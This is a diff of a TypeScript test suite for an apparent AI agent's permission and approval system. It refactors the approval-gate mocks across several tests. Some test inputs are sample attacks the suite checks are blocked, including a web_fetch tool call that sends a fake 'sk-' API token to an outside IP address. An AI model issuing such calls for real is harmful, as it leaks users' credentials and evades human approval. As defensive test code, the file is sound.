@@ -22,6 +22,7 @@ import { createWebFetchTool } from "../../tools/web-fetch.js";
 import { createDynamicTool } from "../../tools/base.js";
 import { AuditLogger } from "../../audit/audit-logger.js";
 import { cleanupTmpDir } from "../../__tests__/support/tmp-dir-teardown.js";
+import { answeredApprovalDecision, answeringRequestAndWait } from "../../__tests__/support/answering-approval-gate.js";
 
 let directory: string;
 let project: string;
@@ -100,7 +101,7 @@ describe("scoped permission rules", () => {
     mkdirSync(join(project, "src", "secret"));
     writeFileSync(join(project, "src", "secret", "keep.txt"), "keep");
     writeFileSync(join(project, "src", "public.txt"), "public");
-    const requestAndWait = vi.fn(async () => ({ choice: "deny-once" }));
+    const requestAndWait = answeringRequestAndWait(() => ({ choice: "deny-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const checkDetailed = vi.spyOn(manager, "checkDetailed");
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
@@ -139,7 +140,7 @@ describe("scoped permission rules", () => {
     registry.register(new WriteFileTool());
     await manager.loadRulesFromFile();
     await manager.addRulePersist(allow(rule), { kind: "user" });
-    const requestAndWait = vi.fn(async () => ({ choice: "deny-once" }));
+    const requestAndWait = answeringRequestAndWait(() => ({ choice: "deny-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "control-file", name: "write_file", input: { path, content: "#!/bin/sh" } },
@@ -468,7 +469,7 @@ describe("scoped permission rules", () => {
     expect(readFileSync(target, "utf8")).toBe("created");
     expect(requestAndWait).not.toHaveBeenCalled();
     const sibling = join(external, "sibling.txt");
-    requestAndWait.mockResolvedValueOnce({ choice: "deny-once" });
+    requestAndWait.mockImplementationOnce(() => answeredApprovalDecision({ choice: "deny-once" }));
     const [blocked] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "external-sibling", name: "write_file", input: { path: sibling, content: "must not write" } },
     ], { sessionId: "external-file", permissionContext: userPermissionContext() }));
@@ -487,7 +488,7 @@ describe("scoped permission rules", () => {
     expect(manager.checkScopedRules(subject, project)).toEqual({});
     const registry = new ToolRegistry();
     registry.register(new WriteFileTool());
-    const requestAndWait = vi.fn(async () => ({ choice: "deny-once" }));
+    const requestAndWait = answeringRequestAndWait(() => ({ choice: "deny-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "generic-allow", name: "write_file", input: { path: join(directory, "external.txt"), content: "must not write" } },
@@ -519,7 +520,7 @@ describe("scoped permission rules", () => {
     }, callTool);
     const registry = new ToolRegistry();
     registry.register(tool);
-    const requestAndWait = vi.fn(async () => ({ choice: "deny-once" }));
+    const requestAndWait = answeringRequestAndWait(() => ({ choice: "deny-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "mcp-rule", name: tool.name, input: {} },
@@ -544,7 +545,7 @@ describe("scoped permission rules", () => {
     }) as unknown as typeof fetch;
     const registry = new ToolRegistry();
     registry.register(createWebFetchTool(transport));
-    const requestAndWait = vi.fn(async () => ({ choice: "deny-once" as const }));
+    const requestAndWait = answeringRequestAndWait(() => ({ choice: "deny-once" as const }));
     const review = vi.spyOn(manager, "dispatchReviewer");
     const permission = vi.spyOn(manager, "checkDetailed");
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
@@ -602,7 +603,7 @@ describe("scoped permission rules", () => {
     }) as unknown as typeof fetch;
     const registry = new ToolRegistry();
     registry.register(createWebFetchTool(transport));
-    const requestAndWait = vi.fn(async (_request: import("../approval-gate.js").ApprovalRequestInput) => ({ choice: "allow-once" }));
+    const requestAndWait = answeringRequestAndWait<import("../approval-gate.js").ApprovalRequestInput>(() => ({ choice: "allow-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "credential-request", name: "web_fetch", input: { url: `https://93.184.216.34/start?token=${"sk-" + "a".repeat(50)}` } },
@@ -631,7 +632,7 @@ describe("scoped permission rules", () => {
     }) as unknown as typeof fetch;
     const registry = new ToolRegistry();
     registry.register(createWebFetchTool(transport));
-    const requestAndWait = vi.fn(async (_request: import("../approval-gate.js").ApprovalRequestInput) => ({ choice: "allow-once" }));
+    const requestAndWait = answeringRequestAndWait<import("../approval-gate.js").ApprovalRequestInput>(() => ({ choice: "allow-once" }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "ask-host", name: "web_fetch", input: { url: "https://93.184.216.34/start" } },
@@ -649,7 +650,7 @@ describe("scoped permission rules", () => {
     } })) as unknown as typeof fetch;
     const registry = new ToolRegistry();
     registry.register(createWebFetchTool(transport));
-    const requestAndWait = vi.fn(async (_request: import("../approval-gate.js").ApprovalRequestInput) => ({ choice: "allow-once" as const }));
+    const requestAndWait = answeringRequestAndWait<import("../approval-gate.js").ApprovalRequestInput>(() => ({ choice: "allow-once" as const }));
     const executor = new ToolExecutor(registry, undefined, manager, undefined, { requestAndWait } as never, undefined, audit);
     const [result] = await runWithToolExecutionCwd(project, () => executor.executeAll([
       { id: "redirect-credential-denial", name: "web_fetch", input: { url: "https://93.184.216.34/start" } },
